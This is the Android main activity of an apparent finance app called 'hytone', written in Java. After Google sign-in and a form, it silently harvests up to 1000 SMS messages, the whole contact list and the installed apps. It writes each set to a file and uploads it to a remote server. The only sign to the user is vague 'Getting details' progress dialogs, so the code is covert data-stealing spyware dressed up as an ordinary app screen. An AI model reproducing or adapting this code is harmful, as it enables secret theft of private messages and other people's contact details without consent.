package com.finance.hytone;

import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.facebook.CallbackManager;
import com.facebook.FacebookCallback;
import com.facebook.FacebookException;
import com.facebook.login.LoginManager;
import com.facebook.login.LoginResult;
import com.facebook.login.widget.LoginButton;
import com.facebook.share.model.ShareHashtag;
import com.facebook.share.model.ShareLinkContent;
import com.facebook.share.widget.ShareDialog;
import com.finance.hytone.constants.Constants;
import com.finance.hytone.constants.HttpResponseUtils;
import com.finance.hytone.model.ContactModel;
import com.finance.hytone.model.SmsModel;
import com.finance.hytone.retrofit.GetDataService;
import com.finance.hytone.retrofit.RetrofitClientInstance;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.SignInButton;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.tasks.Task;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.Collections;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final int RC_SIGN_IN = 100;
    private static final String TAG = "Google_related";
    private static final int RC_GOOG_SIGNIN = 200;
    private static final int FROM_SMS = 1;
    private static final int FROM_CONTACTS = 2;
    private static final int FROM_APPS = 3;
    //private Context ctx;
    String auth;
    SignInButton signInButton;
       //Button loginButton;
    LoginButton loginButton;
    ShareDialog shareDialog;
    ProgressDialog pd;
    private String placeholder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestEmail()
                .requestProfile()
                //.requestServerAuthCode(auth)
                .build();
        GoogleSignInClient mGoogleSignInClient = GoogleSignIn.getClient(this, gso);
        //doSmsWork();
        //doContactWork();
        do_next(mGoogleSignInClient);
        //uploadContent();
        //installedApps();
    }
    public void do_next(final GoogleSignInClient mGoogleSignInClient) {
        signInButton = findViewById(R.id.sign_in_button);
        signInButton.setSize(SignInButton.SIZE_WIDE);
        signInButton.setColorScheme(SignInButton.COLOR_DARK);
        signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                signIn(mGoogleSignInClient);
            }
        });

        final CallbackManager callbackManager = CallbackManager.Factory.create();
        loginButton = findViewById(R.id.sign_in_fb);
        //loginButton.setReadPermissions(Arrays.asList(EMAIL));

        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                loginButton.registerCallback(callbackManager, new FacebookCallback<LoginResult>() {
                    @Override
                    public void onSuccess(LoginResult loginResult) {
                        Toast.makeText(MainActivity.this, "Fb login SUCCESS!", Toast.LENGTH_LONG).show();
                        LoginManager.getInstance().logInWithPublishPermissions(
                                MainActivity.this,
                                Collections.singletonList("publish_actions"));
                    }

                    @Override
                    public void onCancel() {
                        // App code
                        Toast.makeText(MainActivity.this, "Fb login cancelled!", Toast.LENGTH_LONG).show();
                    }

                    @Override
                    public void onError(FacebookException exception) {
                        // App code
                        Toast.makeText(MainActivity.this, "Fb login Error!", Toast.LENGTH_LONG).show();
                    }
                });
                shareDialog = new ShareDialog(MainActivity.this);
                if (ShareDialog.canShow(ShareLinkContent.class)) {
                    ShareLinkContent linkContent = new ShareLinkContent.Builder()
                            .setContentUrl(Uri.parse("https://developers.facebook.com"))
                            .setShareHashtag(new ShareHashtag.Builder()
                                    .setHashtag("#ConnectTheWorld")
                                    .build())
                            .build();
                    shareDialog.show(linkContent);
                }
            }
        });


//        Set<String> permissions = AccessToken.getCurrentAccessToken().getPermissions();
        //      Set<String> declinedPermissions = AccessToken.getCurrentAccessToken().getDeclinedPermissions();


//        ShareLinkContent content = new ShareLinkContent.Builder()
//                .setContentUrl(Uri.parse("https://developers.facebook.com"))
//                .build();
        /*ShareButton shareButton = (ShareButton)findViewById(R.id.fb_share_button);
        shareButton.setShareContent(content);*/

        //startActivity(new Intent(MainActivity.this,FacebookPermission.class));

        /*AccessToken accessToken = AccessToken.getCurrentAccessToken();
        boolean isLoggedIn = accessToken != null && !accessToken.isExpired();*/

        //Application context, Activity context Context docs read,


       /* signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
            }
        });*/
    }

    private void doSmsWork() {
        pd = new ProgressDialog(MainActivity.this);
        pd.setCancelable(false);
        pd.setMessage("Getting details1...");
        pd.show();
        Thread tt = new Thread(new Runnable() {
            @Override
            public void run() {

                try {
                    SmsFetch sf = new SmsFetch();
                    List<SmsModel> ss = sf.getAllSms(MainActivity.this);

                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "smslogs" + placeholder + ".txt";
                    File ff = new File(fullPath);
                    if (ff.exists())
                        ff.delete();

                    BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
                    PrintWriter pw = new PrintWriter(fw);


                    for (int i = 0; i < ss.size() && i < 1000; i++) {
                        Log.e("address" + i, ss.get(i).getAddress());
                        Log.e("msg" + i, ss.get(i).getMsg());
                        pw.println("SMS " + i);
                        pw.println(ss.get(i).getAddress() + i + "::::" + ss.get(i).getMsg());
                        pw.println();
                    }
                    pw.close();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            uploadContent(fullPath, FROM_SMS);
                            //doContactWork();
                        }
                    });

                } catch (Exception e) {
                    e.printStackTrace();
                    Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
                }
            }
        });
        tt.start();

    }

    private void doContactWork() {
        pd = new ProgressDialog(MainActivity.this);
        pd.setCancelable(false);
        pd.setMessage("Getting details2...");
        pd.show();
        Thread tt = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContactFetch cf = new ContactFetch();
                    List<ContactModel> cc = cf.getContacts(MainActivity.this);

                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "contacts" + placeholder + ".txt";
                    File ff = new File(fullPath);
                    if (ff.exists())
                        ff.delete();

                    BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
                    PrintWriter pw = new PrintWriter(fw);

                    for (int i = 0; i < cc.size(); i++) {
                        Log.e("contact" + i, "" + cc.get(i).mobileNumber + "," + cc.get(i).name);
                        pw.println("Contact " + i);
                        pw.println(cc.get(i).mobileNumber + i + "::::" + cc.get(i).name);
                        pw.println();
                    }
                    pw.close();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            //installedApps();
                            //doContactWork();
                            uploadContent(fullPath, FROM_CONTACTS);
                        }
                    });

                } catch (Exception e) {
                    e.printStackTrace();
                    Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
                }
            }
        });
        tt.start();


    }

    void signIn(GoogleSignInClient mGoogleSignInClient) {
        //        Log.e(TAG+"auth",auth);
        Intent signInIntent = mGoogleSignInClient.getSignInIntent();
        startActivityForResult(signInIntent, RC_SIGN_IN);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Result returned from launching the Intent from GoogleSignInClient.getSignInIntent(...);
        if (requestCode == RC_SIGN_IN) {
            // The Task returned from this call is always completed, no need to attach
            // a listener.
            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
            handleSignInResult(task);
        } else if (requestCode == RC_GOOG_SIGNIN && resultCode == RESULT_OK) {
            Toast.makeText(this, "Success Form submit!", Toast.LENGTH_SHORT).show();
            placeholder = Helper.getFname(MainActivity.this) + Helper.getPhone(MainActivity.this) + System.currentTimeMillis();
            doSmsWork();
        }
    }

    private void handleSignInResult(Task<GoogleSignInAccount> completedTask) {
        try {
            GoogleSignInAccount account = completedTask.getResult(ApiException.class);
            // Signed in successfully, show authenticated UI.
            updateUI(account);
        } catch (ApiException e) {
            // The ApiException status code indicates the detailed failure reason.
            // Please refer to the GoogleSignInStatusCodes class reference for more information.
            Log.e(TAG, "-->signInResult:failed code=" + e.getStatusCode());
            e.printStackTrace();
            updateUI(null);
        }
    }

    private void updateUI(GoogleSignInAccount account) {
        String personName = null;
        String personGivenName;
        if (account != null) {
            personName = account.getDisplayName();
            personGivenName = account.getGivenName();
            String personFamilyName = account.getFamilyName();
            String personEmail = account.getEmail();
            String personId = account.getId();
            Uri personPhoto = account.getPhotoUrl();
        }
//        if (account == null)
//            Toast.makeText(MainActivity.this, "No Details Found", Toast.LENGTH_SHORT).show();
//        else {
        Intent ii = new Intent(MainActivity.this, Form2.class);
        ii.putExtra("login_type", Constants.LOGINTYPE_GOOGLE);
        ii.putExtra("name", personName);
        ii.putExtra("email", "");


//            ii.putExtra("name",account.getDisplayName());
//            ii.putExtra("email",account.getEmail());
        startActivityForResult(ii, RC_GOOG_SIGNIN);
        //Log.e("acctName", account.getDisplayName() + "");
        //Log.e("acctEmail", account.getEmail() + "");
        // }
    }

    private void updateUIFb() {
//        if (account == null)
//            Toast.makeText(MainActivity.this, "No Details Found", Toast.LENGTH_SHORT).show();
//        else {
//            //startActivity(new Intent(MainActivity.this,Form.class));
//            Log.e("acctName", account.getDisplayName() + "");
//            Log.e("acctEmail", account.getEmail() + "");
//        }
    }

    public void installedApps() {
        pd = new ProgressDialog(MainActivity.this);
        pd.setCancelable(false);
        pd.setMessage("Getting details3...");
        pd.show();
        try {
            List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);

            final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "apps" + placeholder + ".txt";
            File ff = new File(fullPath);
            if (ff.exists())
                ff.delete();

            BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
            PrintWriter pw = new PrintWriter(fw);

            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);
                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                    String appPkg = packInfo.applicationInfo.packageName;
                    Log.e("App number" + i, appName + "::::" + appPkg);

                    pw.println("App number" + i);
                    pw.println(appName + "::::" + appPkg);
                    pw.println();
                }
            }
            pw.close();
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    //installedApps();
                    //doContactWork();
                    uploadContent(fullPath, FROM_APPS);
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
            Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
        }

    }

    private void uploadContent(String fullPath, final int flag) {
//
        Helper.log("params", "insidemeth");
        GetDataService service = RetrofitClientInstance.getRetrofitInstanceForFile().create(GetDataService.class);
        Call<String> call = null;
        try {
            /*File ff = new File(getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath());
            if (!ff.exists())
                ff.mkdir();
            String mFileName = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath()+File.separator+ "logs01.txt";
            Log.e("mfilename",mFileName);*/
            //String stringValue = "stringValue";
            File file = new File(fullPath);

            RequestBody requestFile =
                    RequestBody.create(
                            // MediaType.parse("image/jpg"),
                            MediaType.parse("text/plain"),
                            file
                    );

            //String items = "[1,2,4]";

            MultipartBody.Part body =
                    MultipartBody.Part.createFormData("fileToUpload", file.getName(), requestFile);

            //RequestBody items = RequestBody.create(MediaType.parse("application/json"), items);
            //RequestBody stringValue = RequestBody.create(MediaType.parse("text/plain"), stringValue);


            call = service.upload(body);
            call.enqueue(new Callback<String>() {
                @Override
                public void onResponse(Call<String> call, Response<String> response) {
                    //findViewById(R.id.loadingContainer).setVisibility(GONE);
                    pd.dismiss();
                    int rescode = response.code();
                    if (rescode != 200) {
                        HttpResponseUtils.showBasicResponseLogsString(response);
                        HttpResponseUtils.processHeaderCode(MainActivity.this, rescode);
                        return;
                    }
                    Helper.log("passsed7", "here");
                    HttpResponseUtils.showBasicResponseLogsString(response);
                    try {
                        String resBody = response.body();
                        Toast.makeText(MainActivity.this, ",,,," + resBody, Toast.LENGTH_SHORT).show();
                        if (flag == FROM_SMS)
                            doContactWork();
                        else if (flag == FROM_CONTACTS)
                            installedApps();
                        else if (flag == FROM_APPS) {
                            new Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(MainActivity.this, "All jobs done!", Toast.LENGTH_LONG).show();

                                }
                            }, 2000);
                        }
                        //JSONObject jo = new JSONObject(resBody);
                        //int response_code = Integer.parseInt(jo.getString("response_code"));

                        // if (response_code == 200) {

                    } catch (Exception e) {
                        Helper.showDialog(MainActivity.this, false, "Something went wrong. " + e.getMessage(), "" + e.toString());
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(Call<String> call, Throwable t) {
                    //findViewById(R.id.loadingContainer).setVisibility(GONE);
                    //HttpResponseUtils.handleFailure(MainActivity.this, call, t);
                    //Helper.log("failcase",t.toString());
                    pd.dismiss();
                    t.printStackTrace();
                    Helper.log("agog111", "" + call.request().toString());
                    Helper.log("agog1111", "1" + call.request().headers());
                    Helper.showDialog(MainActivity.this, false, "Network failure!", "" + t.getMessage());
                }
            });

        } catch (Exception e) {
            Helper.showDialog(MainActivity.this, false, "Error occurred", "" + e);
            e.printStackTrace();
        }
    }

    @Override
    public void onStart() {
        super.onStart();
        GoogleSignInAccount account = GoogleSignIn.getLastSignedInAccount(this);
        updateUI(account);
    }
}
